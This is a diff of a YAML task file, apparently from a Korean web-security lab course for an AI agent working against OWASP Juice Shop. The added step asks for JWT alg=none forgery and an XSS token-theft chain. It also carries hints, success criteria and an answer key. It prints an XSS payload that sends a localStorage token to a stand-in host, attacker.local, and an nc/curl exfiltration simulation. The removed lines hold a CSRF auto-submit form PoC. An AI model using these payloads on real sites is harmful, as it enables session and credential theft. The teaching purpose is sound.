+    \ 의 정상 동작)\n\nPhase B (XSS payload + JWT 탈취 시뮬레이션):\nXSS payload 텍스트 출력: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`\n\
+    공격자 측 수신 시뮬: `nc -lk 9999 &` 후 다른 터미널에서 `curl \"http://localhost:9999/steal?t=FAKEJWT\"\
+    `.\n`kill %1` 로 nc 종료. 토큰 탈취 흐름 PoC.\n\nPhase C (방어 매트릭스):\n```\n| 위협 | 공격면 |\
+    \ 방어 1 | 방어 2 | 잔존 위험 |\n| JWT alg 변조 | server alg whitelist | strict alg check\
+    \ | RS256 사용 | key leak |\n| localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP\
+    \ 설정 | XSS+CSRF chain |\n| Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict\
+    \ | network mitm |\n| Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device\
+    \ binding | refresh leak |\n```\n표 끝에 \"JuiceShop 권고: alg whitelist + HttpOnly\
+    \ Cookie + SameSite=Strict + refresh rotation\" 한 줄.\n\n종료: echo \"=== Phase A\
+    \ JWT 변조 ===\" / \"=== Phase B XSS 탈취 ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n\
+    반드시 3 phase 모두 실행. 중간 종료 금지.\n\n[도구 권장] integration_scenario: 여러 도구 chain — 정찰\
+    \ (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain —\
+    \ 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업** 등 적합 도구로 호출 후 stdout quote."
+  hint: 'Phase A: JWT alg=none 은 RFC 7519 의 "unsecured JWS". 라이브러리 별로 차단 정책 다름.
 
+    Phase B: nc -lk 로 localhost 수신, curl 로 발신 — 외부 callback 없이 자체 시뮬레이션.
 
-    JuiceShop (http://juice.6v6.lab) 인증 토큰 분석 → CSRF PoC → 매트릭스 보고서 3 phase.
+    Phase C: 4행 매트릭스. JuiceShop 권고 한 줄.
 
-
-    Phase A (JWT 분석):
-
-    `curl -s -i -X POST -H "Content-Type: application/json" -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
-
-    http://juice.6v6.lab/rest/user/login` 실행. 응답 body 에서 JWT 추출.
-
-    header decode: `echo "<JWT>" | cut -d. -f1 | base64 -d 2>/dev/null` → alg=RS256 확인.
-
-    payload decode: `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` → iat/exp/role 확인.
-
-
-    Phase B (CSRF PoC + SameSite 비교):
-
-    JWT-Header 인증은 CSRF 자동발동 안 됨 (이 자체가 분석 결과). 가상 Cookie 사이트 가정해 패스워드 변경
-
-    위조 HTML PoC 출력 (`<form action="http://victim/change_pw" method=POST><input name=newpw
-    value=hacked>
-
-    <script>document.forms[0].submit()</script></form>`).
-
-    SameSite 3 케이스 영향:
-
-    - Strict: 모든 cross-site 요청 차단
-
-    - Lax: GET 허용, POST 차단
-
-    - None: 무방어
-
-
-    Phase C (매트릭스):
-
-    ```
-
-    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |
-
-    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |
-
-    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |
-
-    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |
-
-    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |
-
-    ```
-
-    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.
-
-
-    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
-    Phase C 매트릭스 ===" 묶음.
-
-
-    반드시 3 phase 모두 실행. 중간 종료 금지.
-
-
-    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
-    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
-    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
-  hint: 'Phase A: JWT 는 .으로 3분할. payload base64-d 하면 JSON. exp 가 epoch 초.
-
-    Phase B: JuiceShop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 이 사실이 결론. SameSite 3 케이스는
-    표만.
-
-    Phase C: 4행 매트릭스. JuiceShop 위치 명시.
-
-    포인트: 인증방식이 다르면 CSRF 위협 모델이 다르다는 점.
+    포인트: 단일 취약점이 아닌 *chain* — JWT 변조 + XSS 가 동시면 자격증명+권한 동시 탈취.
 
     '
   category: integration_scenario
@@ -1798,34 +794,33 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: 'JuiceShop JWT 토큰 분석 → CSRF PoC + SameSite 영향 → 인증방식 × 방어 매트릭스.
+      intent: 'JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
 
-        lecture #1·#3·#4 + lab #1·#5·#6 동시 행동 증명.
+        lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
 
         '
       success_criteria:
-      - Phase A — JWT 토큰 추출 + payload decode (alg/exp)
-      - Phase B — CSRF PoC HTML 작성 + SameSite 3 케이스 비교
-      - Phase C — 4행 매트릭스 + JuiceShop 권고
+      - Phase A — 원본 JWT 획득 + alg=none 변조 토큰 생성 + whoami 시도
+      - Phase B — XSS payload 텍스트 + nc/curl 토큰 탈취 시뮬레이션
+      - Phase C — 4행 매트릭스 + 종합 권고 한 줄
       acceptable_methods:
-      - curl POST login + JWT 파싱 (cut + base64)
-      - HTML form PoC 텍스트 출력
+      - curl POST login + python3 base64 변조
+      - nc -lk + curl 자체 시뮬
       - markdown table 매트릭스
-      - jwt_tool / jwt-cracker 추가 가능
+      - jwt_tool / pyjwt 추가 가능
       negative_signs:
-      - JWT decode 누락
-      - CSRF PoC 없이 매트릭스만
-      - SameSite 3 케이스 누락
-      - JuiceShop 의 JWT-Header 특성 분석 누락
+      - JWT 획득만 하고 변조 안 함
+      - XSS payload 만 작성하고 탈취 시뮬 누락
+      - 매트릭스 누락 또는 2행 이하
+      - chain 관점 (JWT+XSS 동시) 분석 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 위 bastion_prompt 그대로. JWT 추출 → decode → PoC HTML → 매트릭스 echo.
+  answer: '🤖 위 bastion_prompt 그대로. JWT 변조 → XSS 시뮬 → 매트릭스 echo.
 
     '
-  answer_detail: |
-    JuiceShop 의 admin 계정 (admin@juice-sh.op / admin123) 으로 로그인해 JWT 추출. header
-    decode 시 alg=**RS256** (RSA 비대칭, HS256 아님) 확인 — header 의 alg 만 변경한 변조
-    공격이 통하는지가 추가 학습 포인트. payload decode 로 iat / exp / role 확인. JuiceShop
-    = JWT-Header 방식이라 cross-site CSRF 자동발동 안 됨 — 이 사실 자체가 핵심 학습 결과.
-    SameSite 매트릭스는 가상 Cookie 사이트 기준 비교 (Juice Shop 자체엔 cookie 없음).
+  answer_detail: 'JWT alg=none 은 학술적 우회 — JuiceShop 은 차단됨. 그 *시도 자체* 가 학습 목표.
+
+    XSS 탈취는 nc 자체 callback 으로 시뮬. 핵심은 *chain* 관점 — 두 취약점이 결합 시 영향 폭증.
+
+    '
   script: ''
